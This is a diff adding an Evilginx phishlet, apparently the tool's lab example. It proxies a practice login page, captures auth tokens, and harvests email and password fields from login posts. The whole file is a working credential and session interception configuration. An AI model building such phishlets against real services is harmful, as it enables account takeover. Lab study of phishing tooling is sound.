@@ -1,0 +1,28 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'akira', orig_sub: 'akira', domain: 'lab.evilginx.com', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+ - {triggers_on: 'akira.lab.evilginx.com', orig_sub: 'akira', domain: 'lab.evilginx.com', search: '" Login "', replace: '" Get Phished! "', mimes: ['text/javascript']}
+auth_tokens:
+  - domain: 'akira.lab.evilginx.com' 
+    keys: ['token:always']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'akira.lab.evilginx.com'
+  path: '/'
+force_post:
+  path: '/api/v1/auth/login'
+  search:
+    - {key: 'email', search: '.*'}
+    - {key: 'password', search: '.*'}
+  force:
+    - {key: 'remember_me', value: '1'}
+  type: 'post'
